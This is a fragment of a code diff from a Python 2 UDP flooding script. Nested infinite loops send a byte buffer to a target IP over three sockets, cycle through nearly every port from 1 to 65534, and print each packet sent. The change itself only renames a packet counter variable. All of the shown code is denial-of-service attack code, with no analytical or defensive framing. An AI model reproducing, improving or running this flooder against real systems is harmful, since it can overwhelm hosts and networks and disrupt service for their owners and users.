@@ -45,16 +45,16 @@ try:
                port = 1
              while True:
                   sock2.sendto(bytes, (ip,port))
-                  speedsent = speedsent + 1
+                  sent = sent + 1
                   port = port + 1
-                  print "Sending %s packet to %s throught port:%s"%(speedsent,ip,port)
+                  print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
                   if port == 65534:
                     port = 1
                   while True:
                        sock3.sendto(bytes, (ip,port))
-                       sentspeedsent = speedsent + 1
+                       sent = sent + 1
                        port = port + 1
-                       print "Sending %s packet to %s throught port:%s"%(speedsent,ip,port)
+                       print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
                        if port == 65534:
                          port = 1
 
